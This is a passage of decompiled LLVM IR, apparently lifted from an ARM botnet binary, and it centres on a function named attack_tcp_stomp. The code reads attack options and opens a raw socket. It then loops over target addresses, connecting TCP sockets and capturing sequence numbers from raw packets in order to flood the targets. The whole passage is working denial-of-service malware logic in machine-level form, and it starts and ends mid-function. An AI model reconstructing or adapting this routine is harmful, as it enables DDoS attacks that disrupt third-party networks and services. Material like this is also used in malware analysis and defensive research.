  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9bd0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9b3c, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a0b0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a0cc = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a0d8 = load i32, i32* @r6, align 4
  store i32 %v0_a0d8, i32* %r0.global-to-local, align 4
  %v2_a0dc = call i32 @calloc(i32 %v0_a0d8, i32 4)
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  store i32 %v0_a0f0, i32* %r0.global-to-local, align 4
  %v5_a0f4 = inttoptr i32 %v0_a0e0 to i32*
  %v6_a0f4 = call i32 @attack_get_opt_int(i32 %v0_a0f0, i32* %v5_a0f4, i32 2, i32 0, i32 %v2_a0dc)
  %v1_a100 = urem i32 %v6_a0f4, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v0_a10c, i32* %r1.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  store i32 %v0_a110, i32* %r0.global-to-local, align 4
  %v5_a114 = trunc i32 %v6_a0f4 to i8
  %v6_a118 = inttoptr i32 %v0_a10c to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 3, i32 65535, i32 %v6_a0f4)
  %v0_a11c = load i32, i32* @r5, align 4
  store i32 %v0_a11c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a118, i32* @r7, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a130 = inttoptr i32 %v0_a11c to i32*
  %v6_a130 = call i32 @attack_get_opt_int(i32 %v0_a12c, i32* %v5_a130, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a138 = urem i32 %v6_a130, 256
  store i32 %v1_a138, i32* %ip.global-to-local, align 4
  %v0_a13c = load i32, i32* @r5, align 4
  store i32 %v0_a13c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a130, 16777216
  %v5_a150 = sdiv i32 %sext, 16777216
  %v6_a150 = inttoptr i32 %v0_a13c to i32*
  %v7_a150 = call i32 @attack_get_opt_int(i32 %v0_a148, i32* %v6_a150, i32 5, i32 1, i32 %v5_a150)
  %v1_a15c = urem i32 %v7_a150, 256
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a164 = load i32, i32* @r5, align 4
  store i32 %v0_a164, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a16c = load i32, i32* @r4, align 4
  store i32 %v0_a16c, i32* %r0.global-to-local, align 4
  %v5_a174 = inttoptr i32 %v0_a164 to i32*
  %v6_a174 = call i32 @attack_get_opt_int(i32 %v0_a16c, i32* %v5_a174, i32 7, i32 65535, i32 %v1_a15c)
  %v0_a178 = load i32, i32* @r5, align 4
  store i32 %v0_a178, i32* %r1.global-to-local, align 4
  %v3_a17c = mul i32 %v6_a174, 65536
  store i32 %v3_a17c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v3_a18c = urem i32 %v6_a174, 65536
  store i32 %v3_a18c, i32* @sl, align 4
  %v5_a190 = inttoptr i32 %v0_a178 to i32*
  %v6_a190 = call i32 @attack_get_opt_int(i32 %v0_a188, i32* %v5_a190, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @attack_get_opt_int(i32 %v0_a1a8, i32* %v5_a1b0, i32 12, i32 1, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @attack_get_opt_int(i32 %v0_a1c8, i32* %v5_a1d0, i32 13, i32 1, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @attack_get_opt_int(i32 %v0_a1e8, i32* %v5_a1f0, i32 14, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a1fc = load i32, i32* @r5, align 4
  store i32 %v0_a1fc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a1fc to i32*
  %v6_a210 = call i32 @attack_get_opt_int(i32 %v0_a208, i32* %v5_a210, i32 15, i32 0, i32 %v1_a1f8)
  %v1_a218 = urem i32 %v6_a210, 256
  store i32 %v1_a218, i32* %ip.global-to-local, align 4
  %v0_a21c = load i32, i32* @r5, align 4
  store i32 %v0_a21c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a228 = load i32, i32* @r4, align 4
  store i32 %v0_a228, i32* %r0.global-to-local, align 4
  %v5_a230 = inttoptr i32 %v0_a21c to i32*
  %v6_a230 = call i32 @attack_get_opt_int(i32 %v0_a228, i32* %v5_a230, i32 16, i32 0, i32 %v1_a218)
  %v1_a238 = urem i32 %v6_a230, 256
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r5, align 4
  store i32 %v0_a244, i32* %r1.global-to-local, align 4
  %v0_a248 = load i32, i32* @r4, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v5_a250 = inttoptr i32 %v0_a244 to i32*
  %v6_a250 = call i32 @attack_get_opt_int(i32 %v0_a248, i32* %v5_a250, i32 0, i32 768, i32 %v1_a238)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a260 = load i32, i32* @r5, align 4
  store i32 %v0_a260, i32* %r1.global-to-local, align 4
  %v0_a264 = load i32, i32* @r4, align 4
  store i32 %v0_a264, i32* %r0.global-to-local, align 4
  %v5_a268 = inttoptr i32 %v0_a260 to i32*
  %v6_a268 = call i32 @attack_get_opt_int(i32 %v0_a264, i32* %v5_a268, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a270 = urem i32 %v6_a268, 256
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a284 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v7_a288 = icmp eq i32 %v3_a284, -1
  store i1 %v7_a288, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a284, i32* @sb, align 4
  br i1 %v7_a288, label %dec_label_pc_a478, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a29c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a29c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a2b0 = call i32 @__GI_setsockopt(i32 %v3_a284, i32 0, i32 3, i32 %v6_a29c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a2b0, i32* %r0.global-to-local, align 4
  %v7_a2b4 = icmp eq i32 %v5_a2b0, -1
  store i1 %v7_a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2b4, label %dec_label_pc_a470, label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a294
  %v0_a2bc = load i32, i32* @r7, align 4
  %v3_a2bc = mul i32 %v0_a2bc, 65536
  store i32 %v3_a2bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a2c4 = load i32, i32* @r6, align 4
  %v2_a2c4 = icmp eq i32 %v0_a2c4, 0
  store i1 %v2_a2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a2cc = urem i32 %v0_a2bc, 65536
  store i32 %v3_a2cc, i32* @fp, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a6fc, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %dec_label_pc_a2bc
  %v2_a320 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a364 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a39c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a3a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a3ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_a40c = zext i8 %tmp to i32
  %v1_a410 = and i32 %v4_a40c, 18
  %v2_a414 = icmp eq i32 %v1_a410, 18
  %v3_a3f8 = sext i16 %tmp61 to i32
  %v1_a41c = and i32 %v4_a40c, 5
  %v2_a41c = icmp eq i32 %v1_a41c, 0
  %v4_a35c = add i32 %v2_a320, 82
  %v5_a35c = inttoptr i32 %v4_a35c to i16*
  %v1_a54c = add i32 %v6_a250, 40
  %v1_a660 = urem i32 %v6_a190, 2
  %tmp97 = sub nsw i32 0, %v1_a660
  %v4_a668 = and i32 %tmp97, 32
  %v1_a678 = urem i32 %v6_a1b0, 2
  %tmp98 = sub nsw i32 0, %v1_a678
  %v4_a680 = and i32 %tmp98, 16
  %v1_a690 = urem i32 %v6_a1d0, 2
  %tmp99 = sub nsw i32 0, %v1_a690
  %v4_a698 = and i32 %tmp99, 8
  %v1_a6a8 = urem i32 %v6_a1f0, 2
  %tmp100 = sub nsw i32 0, %v1_a6a8
  %v4_a6b0 = and i32 %tmp100, 4
  %v1_a6c0 = urem i32 %v6_a210, 2
  %tmp101 = sub nsw i32 0, %v1_a6c0
  %v3_a6c8 = and i32 %tmp101, 2
  %v1_a6d8 = urem i32 %v6_a230, 2
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4.preheader, %dec_label_pc_a448
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a448 ], [ %tmp34, %dec_label_pc_a2d4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a448 ], [ %tmp37, %dec_label_pc_a2d4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2e0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v7_a2e4 = icmp eq i32 %v3_a2e0, -1
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2e0, i32* @r5, align 4
  br i1 %v7_a2e4, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a424
  %v0_a2f8 = phi i32 [ %v3_a438, %dec_label_pc_a424 ], [ %v3_a2e0, %dec_label_pc_a2d4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a424 ], [ %stack_var_-62.0, %dec_label_pc_a2d4 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4f8, %dec_label_pc_a424 ], [ %stack_var_-60.0, %dec_label_pc_a2d4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a2f8 = call i32 @__libc_fcntl(i32 %v0_a2f8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a300 = or i32 %v2_a2f8, 2048
  store i32 %v1_a300, i32* @r2, align 4
  %v0_a304 = load i32, i32* @r5, align 4
  store i32 %v0_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %v0_a304, i32 4)
  %v3_a30c = load i32, i32* %stack_var_-44, align 4
  %v5_a314 = mul i32 %v3_a30c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a328 = add i32 %v5_a314, %arg2
  store i32 %v2_a328, i32* %r3.global-to-local, align 4
  %v1_a32c = add i32 %v2_a328, 20
  %v2_a32c = inttoptr i32 %v1_a32c to i8*
  %v3_a32c = load i8, i8* %v2_a32c, align 1
  %v4_a32c = zext i8 %v3_a32c to i32
  store i32 %v4_a32c, i32* %r2.global-to-local, align 4
  %v2_a330 = icmp ugt i8 %v3_a32c, 30
  %v7_a330 = icmp eq i8 %v3_a32c, 31
  store i1 %v7_a330, i1* %cpsr_z.global-to-local, align 1
  %v2_a334 = xor i1 %v7_a330, true
  %v3_a334 = and i1 %v2_a330, %v2_a334
  br i1 %v3_a334, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2f0
  %v5_a334 = add i32 %v2_a328, 16
  %v6_a334 = inttoptr i32 %v5_a334 to i32*
  %v7_a334 = load i32, i32* %v6_a334, align 4
  store i32 %v7_a334, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2f0, %bb
  %v4_a338 = phi i32 [ %v2_a328, %dec_label_pc_a2f0 ], [ %v7_a334, %bb ]
  %v4_a338.stack_var_-60.1 = select i1 %v3_a334, i32 %v4_a338, i32 %stack_var_-60.1
  %v2_a33c = xor i1 %v2_a330, true
  %v3_a33c = or i1 %v7_a330, %v2_a33c
  br i1 %v3_a33c, label %dec_label_pc_a484, label %dec_label_pc_a340

dec_label_pc_a340:                                ; preds = %bb71, %dec_label_pc_a484
  %v0_a4f8 = phi i32 [ %v5_a4d4, %dec_label_pc_a484 ], [ %v4_a338.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @sl, align 4
  %v9_a348 = icmp eq i32 %v0_a348, 65535
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a4e0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a340
  %v4_a34c = udiv i32 %v0_a348, 256
  %v2_a350 = urem i32 %v0_a348, 256
  store i32 %v2_a350, i32* %r2.global-to-local, align 4
  %v5_a354 = mul nuw nsw i32 %v2_a350, 256
  %v6_a354 = or i32 %v5_a354, %v4_a34c
  store i32 %v6_a354, i32* %r3.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  %v2_a35c = trunc i32 %v6_a354 to i16
  store i16 %v2_a35c, i16* %v5_a35c, align 2
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %.thread9, %dec_label_pc_a4e0
  %stack_var_-62.2 = phi i16 [ %v1_a4e0, %dec_label_pc_a4e0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a36c = load i32, i32* @r5, align 4
  store i32 %v0_a36c, i32* %r0.global-to-local, align 4
  %v3_a370 = call i32 @__libc_connect(i32 %v0_a36c, i32 %v2_a364, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a378 = call i32 @__GI_time(i32* null)
  store i32 %v2_a378, i32* %r0.global-to-local, align 4
  store i32 %v2_a378, i32* @r4, align 4
  %v9_a3d8 = icmp eq i32 %tmp35, %v0_a4f8
  %v4_a400 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a3d8 to i32
  %v9_a3ec = icmp eq i1 %v9_a3d8, false
  %v9_a404 = icmp eq i32 %v3_a3f8, %v4_a400
  br label %dec_label_pc_a394

dec_label_pc_a384:                                ; preds = %.thread, %dec_label_pc_a3f4, %dec_label_pc_a41c, %bb75
  %v2_a384 = call i32 @__GI_time(i32* null)
  %v0_a388 = load i32, i32* @r4, align 4
  %v2_a388 = sub i32 %v2_a384, %v0_a388
  store i32 %v2_a388, i32* %r0.global-to-local, align 4
  %v7_a38c = icmp eq i32 %v2_a388, 10
  store i1 %v7_a38c, i1* %cpsr_z.global-to-local, align 1
  %v8_a390 = icmp sgt i32 %v2_a388, 10
  br i1 %v8_a390, label %dec_label_pc_a424, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a364
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a3a8, i32* %r1.global-to-local, align 4
  store i32 %v2_a3ac, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a3b4 = load i32, i32* @sb, align 4
  store i32 %v0_a3b4, i32* %r0.global-to-local, align 4
  %v6_a3bc = call i32 @__libc_recvfrom(i32 %v0_a3b4, i32 %v2_a3a8, i32 256, i32 16384, i32 %v2_a39c, i32 %v2_a3ac)
  store i32 %v6_a3bc, i32* %r2.global-to-local, align 4
  %v7_a3c4 = icmp eq i32 %v6_a3bc, -1
  store i1 %v7_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a3c4, label %dec_label_pc_a478, label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a394
  store i32 %v0_a4f8, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3e4 = icmp eq i32 %v6_a3bc, 40
  store i1 %v7_a3e4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_a3bc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a384

bb75:                                             ; preds = %dec_label_pc_a3d0
  store i1 %v9_a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ec, label %dec_label_pc_a384, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %bb75
  store i32 %v3_a3f8, i32* @lr, align 4
  store i32 %v2_a320, i32* @r3, align 4
  store i32 %v4_a400, i32* %r2.global-to-local, align 4
  store i1 %v9_a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a404, label %dec_label_pc_a40c, label %dec_label_pc_a384

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3f4
  store i32 %v4_a40c, i32* %r2.global-to-local, align 4
  store i32 %v1_a410, i32* @r3, align 4
  store i1 %v2_a414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a414, label %dec_label_pc_a4f0, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a40c
  store i1 %v2_a41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a41c, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a384
  %v0_a424 = load i32, i32* @r5, align 4
  store i32 %v0_a424, i32* %r0.global-to-local, align 4
  %v1_a428 = call i32 @__GI___libc_close(i32 %v0_a424)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a438 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v3_a43c = icmp eq i32 %v3_a438, -1
  %v8_a43c = icmp eq i32 %v3_a438, -1
  store i1 %v8_a43c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a438, i32* @r5, align 4
  br i1 %v3_a43c, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a448:                                ; preds = %dec_label_pc_a424, %dec_label_pc_a2d4, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a2d4 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_a424 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a2d4 ], [ %v0_a4f8, %bb82 ], [ %v0_a4f8, %dec_label_pc_a424 ]
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v1_a44c = add i32 %v3_a448, 1
  store i32 %v1_a44c, i32* @r3, align 4
  %v1_a450 = load i32, i32* @r6, align 4
  %v9_a450 = icmp eq i32 %v1_a44c, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a44c, i32* %stack_var_-44, align 4
  %v5_a458 = icmp slt i32 %v1_a44c, %v1_a450
  br i1 %v5_a458, label %dec_label_pc_a2d4, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448
  store i32 %v6_a250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a70c

dec_label_pc_a470:                                ; preds = %dec_label_pc_a294
  %v0_a470 = load i32, i32* @sb, align 4
  store i32 %v0_a470, i32* %r0.global-to-local, align 4
  %v1_a474 = call i32 @__GI___libc_close(i32 %v0_a470)
  store i32 %v1_a474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a394, %entry, %dec_label_pc_a470
  %v1_a480 = phi i32 [ %v3_a284, %entry ], [ %v1_a474, %dec_label_pc_a470 ], [ 0, %dec_label_pc_a394 ]
  store i32 %v27_a0b0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a480

dec_label_pc_a484:                                ; preds = %bb71
  %v1_a484 = add i32 %v4_a338, 16
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r4, align 4
  %v0_a488 = call i32 @rand_next()
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, 65280
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v5_a4b8 = call i32 @llvm.bswap.i32(i32 %v0_a49c)
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v1_a508 = and i32 %v3_a4fc, 65280
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v5_a520 = call i32 @llvm.bswap.i32(i32 %v3_a4fc)
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
